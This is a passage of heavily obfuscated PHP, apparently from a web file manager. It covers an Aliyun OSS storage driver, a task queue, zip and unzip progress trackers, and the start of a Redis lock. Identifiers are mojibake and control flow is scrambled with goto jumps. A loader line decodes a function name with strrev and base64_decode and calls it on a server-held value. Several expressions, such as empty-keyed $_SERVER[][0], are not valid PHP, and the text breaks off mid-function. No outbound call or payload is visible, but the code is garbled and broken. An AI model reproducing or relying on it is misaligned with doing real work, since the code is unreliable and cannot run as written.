parse_url_query($cÏ¡ğĞÚÚ[$D¹…ÍåÕ[165]]); $BËÏŒ²‹± = $this->client->listParts($this->bucket, $this->pathEncode($c©½‚ˆ›åÚ), $d‰É‡¶™İŸ[$D¹…ÍåÕ[217]]); goto eÃğ…šÀëÖ; eÃğ…šÀëÖ: $d£‹äêÕµ = $BËÏŒ²‹±->getListPart(); $A¢µé¸«Æ‡ = array(); foreach ($d£‹äêÕµ as $Fø£¤±¨“À) { $A¢µé¸«Æ‡[] = array($D¹…ÍåÕ[1241] => $Fø£¤±¨“À->getPartNumber(), $D¹…ÍåÕ[1242] => trim($Fø£¤±¨“À->getETag(), $D¹…ÍåÕ[113])); } goto fÅïÀÉÌİ ; C¯ä¿÷’Ë: } public function download($CöÙñ‹õ, $BåÈ‰áôÌª) { if ($this->isFolder($CöÙñ‹õ)) { return !1; } try { $Bì‡£æï¯² = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $BåÈ‰áôÌª); $Bì‡£æï¯² = $this->trafficLimit($_SERVER[ÈİÅ¿ÈÈ¥×][105], $Bì‡£æï¯²); $this->client->getObject($this->bucket, $this->pathEncode($CöÙñ‹õ), $Bì‡£æï¯²); } catch (OSS\Core\OssException $C çàÃÚ) { return !1; } return $BåÈ‰áôÌª; } public function fileSubstr($e¦ìŞà¬ô, $bõ ğ›öäò = 0, $D¦Ú“İ½Ö´ = false) { if ($bõ ğ›öäò === -1) { $cÂ„èáÏİß = array(); } else { if ($D¦Ú“İ½Ö´ === !1) { $bŸØÆ¦íŒ× = $this->size($e¦ìŞà¬ô); } else { $bŸØÆ¦íŒ× = $bõ ğ›öäò + $D¦Ú“İ½Ö´ - 1; } $cÂ„èáÏİß = array(OSS\OssClient::OSS_RANGE => "{$bõ ğ›öäò}\55{$bŸØÆ¦íŒ×}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($e¦ìŞà¬ô), $cÂ„èáÏİß); } catch (OSS\Core\OssException $d¯°£Óµ”) { think_exception($d¯°£Óµ”->getMessage()); return !1; } } private function trafficLimit($d²ªª‹×ç¿, $c³¥×ğÚÎ­ = array()) { goto fˆËáù‰İ ; C‘â’Õ¿î: if (!$bƒÙ¢½õ) { return $c³¥×ğÚÎ­; } $bƒÙ¢½õ = $bƒÙ¢½õ < 819200 ? 819200 : ($bƒÙ¢½õ > 838860800 ? 838860800 : $bƒÙ¢½õ); $c³¥×ğÚÎ­[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($bƒÙ¢½õ); goto E›‚åÙÇìœ; fˆËáù‰İ : $Cß¢ÙëÙæ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($d²ªª‹×ç¿ == $Cß¢ÙëÙæ[1248] && $this->isUploadServer() || $d²ªª‹×ç¿ == $Cß¢ÙëÙæ[105] && $this->isFileOutServer()) { return $c³¥×ğÚÎ­; } $bƒÙ¢½õ = floatval($GLOBALS[$Cß¢ÙëÙæ[6]][$Cß¢ÙëÙæ[84]][$Cß¢ÙëÙæ[103]][$d²ªª‹×ç¿]) * 1024 * 1024 * 8; goto C‘â’Õ¿î; E›‚åÙÇìœ: return $c³¥×ğÚÎ­; goto Aœ¹´„‹; Aœ¹´„‹: } public function link($DªáËŠ¾¶ê, $a¹ãì¥Ê¯å = array()) { $dõ´²¡¹ã± =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$this->exist($DªáËŠ¾¶ê) || $this->isFolder($DªáËŠ¾¶ê)) { return !1; } try { $a¹ãì¥Ê¯å = $this->trafficLimit($dõ´²¡¹ã±[105], $a¹ãì¥Ê¯å); $F£º¼³½ã = $this->client->signUrl($this->bucket, $this->pathEncode($DªáËŠ¾¶ê), 3600 * 12, $dõ´²¡¹ã±[224], $a¹ãì¥Ê¯å); return $this->getCdnLink($F£º¼³½ã); } catch (OSS\Core\OssException $bÎÊ„ó«‚) { return !1; } } public function fileOut($EŸö¸å ˜Ç, $dƒ×½¨Ø§Ñ = false, $FŠÏñ¿¢ä« = false, $CÄäß¾«Ÿ§ = '') { goto fšõİÑ¥•; B‡î´íĞÛÔ: $FŠÏñ¿¢ä« = rawurlencode($FŠÏñ¿¢ä«); $DÙ¼ˆš÷ÁŠ = get_file_mime(get_path_ext($FŠÏñ¿¢ä«)); if ($DÙ¼ˆš÷ÁŠ == $AãõÖÌæ¦[209]) { return parent::fileOut($EŸö¸å ˜Ç, $dƒ×½¨Ø§Ñ, $FŠÏñ¿¢ä«, $CÄäß¾«Ÿ§); } goto DÜ‡êä—†×; CõßØ‡£ : $fÔ²ØĞ˜¥ˆ = $this->link($EŸö¸å ˜Ç, $AœÖç¦¸‘Á); $this->fileOutLink($fÔ²ØĞ˜¥ˆ); goto EçÄì„Íèö; fšõİÑ¥•: $AãõÖÌæ¦ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($this->isFileOutServer()) { return $this->fileOutServer($EŸö¸å ˜Ç, $dƒ×½¨Ø§Ñ, $FŠÏñ¿¢ä«, $CÄäß¾«Ÿ§); } if (!$FŠÏñ¿¢ä«) { $FŠÏñ¿¢ä« = $this->pathThis($EŸö¸å ˜Ç); } goto B‡î´íĞÛÔ; DÜ‡êä—†×: $dƒ×½¨Ø§Ñ = $dƒ×½¨Ø§Ñ ? $AãõÖÌæ¦[210] : $AãõÖÌæ¦[211]; $AœÖç¦¸‘Á = array(OSS\OssClient::OSS_SUB_RESOURCE => $AãõÖÌæ¦[1259] . rawurlencode("{$dƒ×½¨Ø§Ñ}\x3b\x66\151\154\x65\x6e\x61\x6d\145\75{$FŠÏñ¿¢ä«}")); $AœÖç¦¸‘Á[OSS\OssClient::OSS_SUB_RESOURCE] .= $AãõÖÌæ¦[1260] . rawurlencode($DÙ¼ˆš÷ÁŠ); goto CõßØ‡£ ; EçÄì„Íèö: } public function fileOutServer($C× Óç§¡‘, $aÒ¤ˆ¼ôÆ = false, $eÍ‚âğŒÛ‰ = false, $c»ÜÌïÑ« = '') { parent::fileOut($C× Óç§¡‘, $aÒ¤ˆ¼ôÆ, $eÍ‚âğŒÛ‰, $c»ÜÌïÑ«); } public function fileOutImage($FêñÚ·µ¢±, $b¾í‰éñÏ¨ = 250) { $F¨ˆôÒà = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ÈİÅ¿ÈÈ¥×][1261] . $b¾í‰éñÏ¨); $A¯›ãá»¥İ = $this->link($FêñÚ·µ¢±, $F¨ˆôÒà); $this->fileOutLink($A¯›ãá»¥İ); } public function fileOutImageServer($AÙßçâ¶‘¶, $Fê®øâ•â = 250) { parent::fileOutImage($AÙßçâ¶‘¶, $Fê®øâ•â); } public function fileOutLink($fêĞ ˆµÏæ) { $Cµ¢ ù”Êˆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$this->isCdnHost() && substr($fêĞ ˆµÏæ, 0, 7) == $Cµ¢ ù”Êˆ[1165]) { $fêĞ ˆµÏæ = $Cµ¢ ù”Êˆ[1166] . substr($fêĞ ˆµÏæ, 7); } header($Cµ¢ ù”Êˆ[156] . $fêĞ ˆµÏæ); die; } public function hashMd5($EÖğÅ«À²ê, $Eà™ë¾‡¸ = '') { $Aí¦—“³ÕÜ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dÔµ•°êß = $this->_objectMeta($EÖğÅ«À²ê); if (!$dÔµ•°êß) { return $Aí¦—“³ÕÜ[33]; } if (!isset($dÔµ•°êß[$Aí¦—“³ÕÜ[1237]]) && !empty($Eà™ë¾‡¸)) { $bŞšÒ‚Ë“ = $this->updateObjMeta($EÖğÅ«À²ê, array($Aí¦—“³ÕÜ[1237] => $Eà™ë¾‡¸)); $dÔµ•°êß[$Aí¦—“³ÕÜ[1237]] = $bŞšÒ‚Ë“ ? $Eà™ë¾‡¸ : $Aí¦—“³ÕÜ[33]; } return isset($dÔµ•°êß[$Aí¦—“³ÕÜ[1237]]) ? strtolower($dÔµ•°êß[$Aí¦—“³ÕÜ[1237]]) : $Aí¦—“³ÕÜ[33]; } public function size($FéÌ‚°´«) { $e›×å‰£Èœ = $this->objectMeta($FéÌ‚°´«); return $e›×å‰£Èœ ? $e›×å‰£Èœ[$_SERVER[ÈİÅ¿ÈÈ¥×][77]] : 0; } public function info($fô«¯ƒ¾õ) { if ($this->isFolder($fô«¯ƒ¾õ)) { return $this->folderInfo($fô«¯ƒ¾õ); } else { if ($this->isFile($fô«¯ƒ¾õ)) { return $this->fileInfo($fô«¯ƒ¾õ); } } return !1; } public function exist($CãÒ«ê‰¸) { return $this->isFile($CãÒ«ê‰¸) || $this->isFolder($CãÒ«ê‰¸); } public function isFile($eòÜóƒñÚ£) { return !$this->isFolder($eòÜóƒñÚ£) && $this->objectMeta($eòÜóƒñÚ£); } public function isFolder($f¸à§¾ÎÓ†) { return $this->cacheMethod($_SERVER[ÈİÅ¿ÈÈ¥×][195], $f¸à§¾ÎÓ†); } protected function objectMeta($C¦‡®‰Ä¨ä) { return $this->cacheMethod($_SERVER[ÈİÅ¿ÈÈ¥×][196], $C¦‡®‰Ä¨ä); } protected function _objectMeta($cø¼¼ßò«–) { $Eê§¤“Ê =& $_SERVER[ÈİÅ¿ÈÈ¥×]; try { $dÁ´Í¨ïÂŠ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($cø¼¼ßò«–)); } catch (OSS\Core\OssException $AÛËåšÅÌ¡) { $dÁ´Í¨ïÂŠ = !1; } if ($dÁ´Í¨ïÂŠ) { $dÁ´Í¨ïÂŠ[$Eê§¤“Ê[77]] = intval($dÁ´Í¨ïÂŠ[$Eê§¤“Ê[1235]]); } return $dÁ´Í¨ïÂŠ; } protected function _isFolder($D÷ªù¿ĞóÖ) { $D‰Ë†‹³À² =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($D÷ªù¿ĞóÖ == $D‰Ë†‹³À²[33] || $D÷ªù¿ĞóÖ == $D‰Ë†‹³À²[8]) { return !0; } $F“’è³¡Šğ = array($D‰Ë†‹³À²[1231] => $D‰Ë†‹³À²[8], $D‰Ë†‹³À²[1232] => rtrim($D÷ªù¿ĞóÖ, $D‰Ë†‹³À²[8]) . $D‰Ë†‹³À²[8], $D‰Ë†‹³À²[1233] => 1, $D‰Ë†‹³À²[1234] => $D‰Ë†‹³À²[33]); $C½±íæ¶É = $this->client->listObjects($this->bucket, $F“’è³¡Šğ); if ($C½±íæ¶É->getObjectList() || $C½±íæ¶É->getPrefixList()) { return !0; } return !1; } } goto A‰©Øç°°ß; B½“Şõˆßë: class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\164\141\163\153\x51\x75\145\x75\145\x4c\x65\156\x67\164\150"; const QUEUE_DATA = "\x74\141\x73\153\121\x75\145\x75\x65\104\141\x74\x61"; public static function initTask() { } public static function add($A­ØÛ¥ö¦‚, $C¬ãÔ²ë‡ä = array(), $f†ï–çùÄ = '', $Aİ˜“ˆ¾Ø = '') { goto Cè¹ŒÊÃ›; c”á»Ù´ŸÃ: self::setAll($eï ±¾Œª¥); return !0; goto cğ÷÷áŞøÃ; Cè¹ŒÊÃ›: $få¢Íß„ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (self::count() >= self::MAX_LENGTH) { return !1; } $eï ±¾Œª¥ = self::getAll(); goto fÍ©²‡†é«; fÍ©²‡†é«: if ($Aİ˜“ˆ¾Ø && array_find_by_field($eï ±¾Œª¥, $få¢Íß„[89], $Aİ˜“ˆ¾Ø)) { return !0; } $eï ±¾Œª¥[] = array($få¢Íß„[258] => $A­ØÛ¥ö¦‚, $få¢Íß„[1562] => $C¬ãÔ²ë‡ä, $få¢Íß„[421] => $f†ï–çùÄ, $få¢Íß„[89] => $Aİ˜“ˆ¾Ø); write_log($få¢Íß„[1563] . $f†ï–çùÄ, $få¢Íß„[1564]); goto c”á»Ù´ŸÃ; cğ÷÷áŞøÃ: } public static function run() { goto dËÓéÀ¿â·; D—ËÍ‹ÕµÖ: if (!$aÑÆ†Ì‰Å) { return !1; } self::setAll($dÁÑÚ‹ÃÄ); write_log($Eç­À³Ú±[1565] . $aÑÆ†Ì‰Å[$Eç­À³Ú±[421]], $Eç­À³Ú±[1564]); goto AÕ¾ô“‰‹; AÕ¾ô“‰‹: try { $b»÷ÈËê·‰ = Hook::apply($aÑÆ†Ì‰Å[$Eç­À³Ú±[258]], $aÑÆ†Ì‰Å[$Eç­À³Ú±[1562]]); } catch (Exception $c¦°“·ƒÖ) { } write_log($Eç­À³Ú±[1566] . $aÑÆ†Ì‰Å[$Eç­À³Ú±[421]], $Eç­À³Ú±[1564]); return !0; goto d‡‰†İª§‹; dËÓéÀ¿â·: $Eç­À³Ú± =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dÁÑÚ‹ÃÄ = self::getAll(); $aÑÆ†Ì‰Å = array_shift($dÁÑÚ‹ÃÄ); goto D—ËÍ‹ÕµÖ; d‡‰†İª§‹: } public static function count() { $ašêƒ±‹¾ó = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$ašêƒ±‹¾ó) { return 0; } return intval($ašêƒ±‹¾ó); } public static function getAll() { $Eä›‡„ƒÒ‰ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$Eä›‡„ƒÒ‰) { return array(); } return $Eä›‡„ƒÒ‰; } public static function setAll($eŒ½¾›“½) { $dÜ¬¸îİ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($eŒ½¾›“½), $dÜ¬¸îİ); Cache::set(self::QUEUE_DATA, $eŒ½¾›“½, $dÜ¬¸îİ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto cù©Ğ÷Åğ‡; bó™±áÈñÆ: Hook::bind($cíš³ƒßÎ[1053], array($this, $cíš³ƒßÎ[1569])); $dá¡ôÁË‚’ =& $this->task; $dá¡ôÁË‚’[$cíš³ƒßÎ[1570]] = $cíš³ƒßÎ[1058]; goto añÄ–è‰ÓÖ; cù©Ğ÷Åğ‡: $cíš³ƒßÎ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; parent::startAfter(); Hook::bind($cíš³ƒßÎ[1567], array($this, $cíš³ƒßÎ[1568])); goto bó™±áÈñÆ; añÄ–è‰ÓÖ: if (!$dá¡ôÁË‚’[$cíš³ƒßÎ[1395]]) { $dá¡ôÁË‚’[$cíš³ƒßÎ[1395]] = LNG($cíš³ƒßÎ[1571]); } goto Açä·¸»ñ; Açä·¸»ñ: } protected function endAfter() { $BïÒ²¾Óíå =& $_SERVER[ÈİÅ¿ÈÈ¥×]; parent::endAfter(); Hook::unbind($BïÒ²¾Óíå[1567], array($this, $BïÒ²¾Óíå[1568])); Hook::unbind($BïÒ²¾Óíå[1053], array($this, $BïÒ²¾Óíå[1569])); } public function updateAfter() { $A˜°Ì¡°ù =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $e¬­‚Ÿ‚­ =& $this->task; if (!$e¬­‚Ÿ‚­[$A˜°Ì¡°ù[986]] || !$e¬­‚Ÿ‚­[$A˜°Ì¡°ù[706]]) { return; } if ($e¬­‚Ÿ‚­[$A˜°Ì¡°ù[1570]] == $A˜°Ì¡°ù[1058]) { $FÜ£ä½ê = 0; if ($e¬­‚Ÿ‚­[$A˜°Ì¡°ù[1536]]) { $FÜ£ä½ê = $e¬­‚Ÿ‚­[$A˜°Ì¡°ù[1537]] / $e¬­‚Ÿ‚­[$A˜°Ì¡°ù[1536]]; } $e¬­‚Ÿ‚­[$A˜°Ì¡°ù[1491]] = $FÜ£ä½ê * 0.3; } else { if ($e¬­‚Ÿ‚­[$A˜°Ì¡°ù[1570]] == $A˜°Ì¡°ù[307]) { $FÜ£ä½ê = $e¬­‚Ÿ‚­[$A˜°Ì¡°ù[1000]] / $e¬­‚Ÿ‚­[$A˜°Ì¡°ù[986]]; $e¬­‚Ÿ‚­[$A˜°Ì¡°ù[1491]] = 0.3 + $FÜ£ä½ê * 0.4; } else { if ($e¬­‚Ÿ‚­[$A˜°Ì¡°ù[1570]] == $A˜°Ì¡°ù[103]) { $fïõŠ—Í‚Å = 0; if ($e¬­‚Ÿ‚­[$A˜°Ì¡°ù[1538]] == $A˜°Ì¡°ù[103]) { $fïõŠ—Í‚Å = $e¬­‚Ÿ‚­[$A˜°Ì¡°ù[1537]]; } $FÜ£ä½ê = ($e¬­‚Ÿ‚­[$A˜°Ì¡°ù[1541]] + $fïõŠ—Í‚Å) / $e¬­‚Ÿ‚­[$A˜°Ì¡°ù[706]]; $e¬­‚Ÿ‚­[$A˜°Ì¡°ù[1491]] = 0.3 + 0.4 + $FÜ£ä½ê * 0.3; } } } if ($e¬­‚Ÿ‚­[$A˜°Ì¡°ù[1491]] > 0) { $a‹àŸ¨¦æã = timeFloat() - $e¬­‚Ÿ‚­[$A˜°Ì¡°ù[1493]] - $e¬­‚Ÿ‚­[$A˜°Ì¡°ù[1496]]; $e¬­‚Ÿ‚­[$A˜°Ì¡°ù[1497]] = $a‹àŸ¨¦æã * (1 - $e¬­‚Ÿ‚­[$A˜°Ì¡°ù[1491]]) / $e¬­‚Ÿ‚­[$A˜°Ì¡°ù[1491]]; } } public function addFile($DÄöŞ½Ğì) { goto E•¢’ƒ®Ä; E•¢’ƒ®Ä: $fË¦²Åå÷… =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $F‡Œä±½Á¬ =& $this->task; $døë•ÛìÊÍ = IO::info($DÄöŞ½Ğì); goto BÍ²¶äèÜ…; b¥ÈÌàõÄ‘: $this->update(); goto D‰Ó÷ÚÂàø; BÍ²¶äèÜ…: $F‡Œä±½Á¬[$fË¦²Åå÷…[1534]] = $døë•ÛìÊÍ[$fË¦²Åå÷…[28]]; $F‡Œä±½Á¬[$fË¦²Åå÷…[1536]] = $døë•ÛìÊÍ[$fË¦²Åå÷…[77]]; $F‡Œä±½Á¬[$fË¦²Åå÷…[1537]] = 0; goto Cñ¾®¼à‡È; E›ï˜ã¸×: $F‡Œä±½Á¬[$fË¦²Åå÷…[986]] = 1; $F  Ğƒ»Ç = 0; $F‡Œä±½Á¬[$fË¦²Åå÷…[1545]] = array($fË¦²Åå÷…[1546] => $F  Ğƒ»Ç + 1, $fË¦²Åå÷…[402] => $døë•ÛìÊÍ[$fË¦²Åå÷…[28]], $fË¦²Åå÷…[75] => $døë•ÛìÊÍ[$fË¦²Åå÷…[75]], $fË¦²Åå÷…[483] => $døë•ÛìÊÍ[$fË¦²Åå÷…[483]] ? $døë•ÛìÊÍ[$fË¦²Åå÷…[483]] : $døë•ÛìÊÍ[$fË¦²Åå÷…[75]]); goto b¥ÈÌàõÄ‘; Cñ¾®¼à‡È: $F‡Œä±½Á¬[$fË¦²Åå÷…[988]] = $fË¦²Åå÷…[1553]; $F‡Œä±½Á¬[$fË¦²Åå÷…[1538]] = $fË¦²Åå÷…[1058]; $F‡Œä±½Á¬[$fË¦²Åå÷…[706]] = $døë•ÛìÊÍ[$fË¦²Åå÷…[77]]; goto E›ï˜ã¸×; D‰Ó÷ÚÂàø: } public function unzipAfter($e¬ª«¿”·) { goto f¶äÕŸ‚¥; Bõ··ô‘£÷: $this->update(); self::log($aÛˆ£Ô™Ñ[1572] . json_encode(array($cØç©¶¾‰ , $C†ï”²Ë))); goto aˆÖõ­Š½¢; BÑÂ¼ òâ£: if ($C†ï”²Ë[$aÛˆ£Ô™Ñ[29]] == $aÛˆ£Ô™Ñ[171]) { $cØç©¶¾‰ [$aÛˆ£Ô™Ñ[986]] = 1; } else { $cØç©¶¾‰ [$aÛˆ£Ô™Ñ[986]] = $C†ï”²Ë[$aÛˆ£Ô™Ñ[80]][$aÛˆ£Ô™Ñ[78]]; } $cØç©¶¾‰ [$aÛˆ£Ô™Ñ[988]] = $aÛˆ£Ô™Ñ[33]; $cØç©¶¾‰ [$aÛˆ£Ô™Ñ[1538]] = 0; goto bñ‰¾Šéê; bñ‰¾Šéê: $cØç©¶¾‰ [$aÛˆ£Ô™Ñ[1000]] = 0; $cØç©¶¾‰ [$aÛˆ£Ô™Ñ[1536]] = 0; $cØç©¶¾‰ [$aÛˆ£Ô™Ñ[1537]] = 0; goto F¢Îá‹ƒæÁ; f¶äÕŸ‚¥: $aÛˆ£Ô™Ñ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $cØç©¶¾‰  =& $this->task; $cØç©¶¾‰ [$aÛˆ£Ô™Ñ[1570]] = $aÛˆ£Ô™Ñ[103]; goto cŠÆå†…¦®; F¢Îá‹ƒæÁ: $cØç©¶¾‰ [$aÛˆ£Ô™Ñ[1534]] = $aÛˆ£Ô™Ñ[33]; $cØç©¶¾‰ [$aÛˆ£Ô™Ñ[1541]] = 0; $cØç©¶¾‰ [$aÛˆ£Ô™Ñ[706]] = $C†ï”²Ë[$aÛˆ£Ô™Ñ[77]]; goto Bõ··ô‘£÷; cŠÆå†…¦®: $C†ï”²Ë = IO::infoWithChildren($e¬ª«¿”·); $dÖ¿ØÔùõ± = 0; $cØç©¶¾‰ [$aÛˆ£Ô™Ñ[1545]] = array($aÛˆ£Ô™Ñ[1546] => $dÖ¿ØÔùõ± + 1, $aÛˆ£Ô™Ñ[402] => $C†ï”²Ë[$aÛˆ£Ô™Ñ[28]], $aÛˆ£Ô™Ñ[75] => $C†ï”²Ë[$aÛˆ£Ô™Ñ[75]], $aÛˆ£Ô™Ñ[483] => $C†ï”²Ë[$aÛˆ£Ô™Ñ[483]] ? $C†ï”²Ë[$aÛˆ£Ô™Ñ[483]] : $C†ï”²Ë[$aÛˆ£Ô™Ñ[75]]); goto BÑÂ¼ òâ£; aˆÖõ­Š½¢: } public function nameParse($aÌ¦Øï“©Ï) { goto Fì±Â—öÂ²; côù®ìç…ğ: $this->update(); goto B…È×²–‹; Fì±Â—öÂ²: $B¬ÕÃ‰çˆÍ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dÇ‡©ÆˆÂ =& $this->task; if ($dÇ‡©ÆˆÂ[$B¬ÕÃ‰çˆÍ[1570]] == $B¬ÕÃ‰çˆÍ[1058]) { $dÇ‡©ÆˆÂ[$B¬ÕÃ‰çˆÍ[1570]] = $B¬ÕÃ‰çˆÍ[307]; $dÇ‡©ÆˆÂ[$B¬ÕÃ‰çˆÍ[1541]] = 0; $dÇ‡©ÆˆÂ[$B¬ÕÃ‰çˆÍ[706]] = 0; } goto d¶ïÎ…áâ; d¶ïÎ…áâ: $FêÆòÓî¾º = get_path_this($aÌ¦Øï“©Ï); if (strstr($FêÆòÓî¾º, $B¬ÕÃ‰çˆÍ[91])) { $dÇ‡©ÆˆÂ[$B¬ÕÃ‰çˆÍ[1000]] += 1; $dÇ‡©ÆˆÂ[$B¬ÕÃ‰çˆÍ[986]] += 1; } $dÇ‡©ÆˆÂ[$B¬ÕÃ‰çˆÍ[1534]] = $aÌ¦Øï“©Ï; goto côù®ìç…ğ; B…È×²–‹: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $b÷‚Óœ‚÷ì =& $_SERVER[ÈİÅ¿ÈÈ¥×]; parent::startAfter(); Hook::bind($b÷‚Óœ‚÷ì[1573], array($this, $b÷‚Óœ‚÷ì[1568])); $b±«„…±­£ =& $this->task; $b±«„…±­£[$b÷‚Óœ‚÷ì[1570]] = $b÷‚Óœ‚÷ì[1058]; if (!$b±«„…±­£[$b÷‚Óœ‚÷ì[1395]]) { $b±«„…±­£[$b÷‚Óœ‚÷ì[1395]] = LNG($b÷‚Óœ‚÷ì[1574]); } } protected function endAfter() { $b™¨–ÂË»Œ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; parent::endAfter(); Hook::unbind($b™¨–ÂË»Œ[1573], array($this, $b™¨–ÂË»Œ[1568])); } public function updateAfter() { $cõ¸¾Ø®—² =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bäĞ…ñßÛê =& $this->task; if (!$bäĞ…ñßÛê[$cõ¸¾Ø®—²[986]] || !$bäĞ…ñßÛê[$cõ¸¾Ø®—²[706]]) { return; } if ($bäĞ…ñßÛê[$cõ¸¾Ø®—²[1570]] == $cõ¸¾Ø®—²[1058]) { $D¾î¥©²‹ = $bäĞ…ñßÛê[$cõ¸¾Ø®—²[1537]]; if ($bäĞ…ñßÛê[$cõ¸¾Ø®—²[1538]] != $cõ¸¾Ø®—²[1058]) { $D¾î¥©²‹ = 0; } $e³ÒùÕÜßò = ($bäĞ…ñßÛê[$cõ¸¾Ø®—²[1541]] + $D¾î¥©²‹) / $bäĞ…ñßÛê[$cõ¸¾Ø®—²[706]]; $bäĞ…ñßÛê[$cõ¸¾Ø®—²[1491]] = $e³ÒùÕÜßò * 0.3; } else { if ($bäĞ…ñßÛê[$cõ¸¾Ø®—²[1570]] == $cõ¸¾Ø®—²[307]) { $e³ÒùÕÜßò = $bäĞ…ñßÛê[$cõ¸¾Ø®—²[1000]] / $bäĞ…ñßÛê[$cõ¸¾Ø®—²[986]]; $bäĞ…ñßÛê[$cõ¸¾Ø®—²[1491]] = 0.3 + $e³ÒùÕÜßò * 0.5; } else { if ($bäĞ…ñßÛê[$cõ¸¾Ø®—²[1570]] == $cõ¸¾Ø®—²[103]) { $e³ÒùÕÜßò = 0; if ($bäĞ…ñßÛê[$cõ¸¾Ø®—²[1536]]) { $e³ÒùÕÜßò = $bäĞ…ñßÛê[$cõ¸¾Ø®—²[1537]] / $bäĞ…ñßÛê[$cõ¸¾Ø®—²[1536]]; } $bäĞ…ñßÛê[$cõ¸¾Ø®—²[1491]] = 0.3 + 0.5 + $e³ÒùÕÜßò * 0.2; } } } if ($bäĞ…ñßÛê[$cõ¸¾Ø®—²[1491]] > 0) { $a¿š¦à©¦â = timeFloat() - $bäĞ…ñßÛê[$cõ¸¾Ø®—²[1493]] - $bäĞ…ñßÛê[$cõ¸¾Ø®—²[1496]]; $bäĞ…ñßÛê[$cõ¸¾Ø®—²[1497]] = $a¿š¦à©¦â * (1 - $bäĞ…ñßÛê[$cõ¸¾Ø®—²[1491]]) / $bäĞ…ñßÛê[$cõ¸¾Ø®—²[1491]]; } } public function copyFileStart($a˜“»è¼­, $AŒ­·±æî¼, $Föê¦Ï›‘°, $bÜÃµÎÊ–, $b†‹í£ÔãŒ, $dæ…²Ãİ²) { $B¦ãè³åê =& $_SERVER[ÈİÅ¿ÈÈ¥×]; parent::copyFileStart($a˜“»è¼­, $AŒ­·±æî¼, $Föê¦Ï›‘°, $bÜÃµÎÊ–, $b†‹í£ÔãŒ, $dæ…²Ãİ²); $B ÃÆğáš =& $this->task; if ($B ÃÆğáš[$B¦ãè³åê[1570]] == $B¦ãè³åê[307]) { $B ÃÆğáš[$B¦ãè³åê[1570]] = $B¦ãè³åê[103]; } $this->update(); } public function copyFileEnd($c‘ƒ¦íÖùİ, $c¡…¾í½ôÅ, $EÙÇ¬î³Ü·, $DóóÚáƒ˜ø, $fÅÕ–„é›å, $b‹ã½›ßÏÕ) { $Dª—­Ç¾İ¯ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Cç‰‰êÆÊ³ =& $this->task; $Cç‰‰êÆÊ³[$Dª—­Ç¾İ¯[1537]] = $Cç‰‰êÆÊ³[$Dª—­Ç¾İ¯[1536]]; $Cç‰‰êÆÊ³[$Dª—­Ç¾İ¯[1541]] += $Cç‰‰êÆÊ³[$Dª—­Ç¾İ¯[1536]]; $Cç‰‰êÆÊ³[$Dª—­Ç¾İ¯[1538]] = $Dª—­Ç¾İ¯[33]; $this->update(); } public function nameParse($eïÈ¤¢×Ö•) { $E¬šàÕ´ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eùØâ×œÆ» =& $this->task; if ($eùØâ×œÆ»[$E¬šàÕ´[1000]] < $eùØâ×œÆ»[$E¬šàÕ´[986]]) { $b„¸­çâá„ = get_path_this($eïÈ¤¢×Ö•); if (strstr($b„¸­çâá„, $E¬šàÕ´[91])) { $eùØâ×œÆ»[$E¬šàÕ´[1000]] += 1; } } if ($eùØâ×œÆ»[$E¬šàÕ´[1570]] == $E¬šàÕ´[1058]) { $eùØâ×œÆ»[$E¬šàÕ´[1570]] = $E¬šàÕ´[307]; } $eùØâ×œÆ»[$E¬šàÕ´[1534]] = $eïÈ¤¢×Ö•; $this->update(); } } goto bÕï˜°Ç¼Ã; cÉõ¹ã„±: $d‰Ñ¡Ü½˜ = strrev(base64_decode($_SERVER[][0])); function binCheckNeq($EÒ´Î÷„, $a”âÚÍ‡÷) { return $EÒ´Î÷„ != $a”âÚÍ‡÷; } $_SERVER[$_SERVER[][1]] = $d‰Ñ¡Ü½˜($_SERVER[$_SERVER[][2]]); goto fƒÆŞÒÃä; D§•ÁŠ˜ó: class CacheLockRedis { public function lock($cÚ„ƒ…Ô¼™, $aš¥—Î„¾ = 10) { $aãšÜ®¸¬¡ = Cache::init(); $F‹´â¦¯® = microtime(!0) + $aš¥—Î„¾; while (microtime(!0) < $F‹´â¦¯®) { $BİßÔ±¥¿Ä = $aãšÜ®¸¬¡->get($cÚ„ƒ…Ô¼™); if (!$BİßÔ±¥¿Ä) { $d‚´×Ï÷­ = $aãšÜ®¸¬¡->setLock($cÚ„ƒ…Ô¼™, $F‹´â¦¯®, $aš¥—Î„¾); if ($d‚´×Ï÷­) { return !0; } } else { if ($BİßÔ±¥¿Ä < microtime(!0)) { $aãšÜ®¸¬¡->set($cÚ„ƒ…Ô¼™, $F‹´â¦¯®, $F‹´â¦¯®); if ($aãšÜ®¸¬¡->get($cÚ„ƒ…Ô¼™) === $BİßÔ±¥¿Ä) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Cˆé—©¤ˆß) { return Cache::init()->get($Cˆé—©¤ˆß); } public function 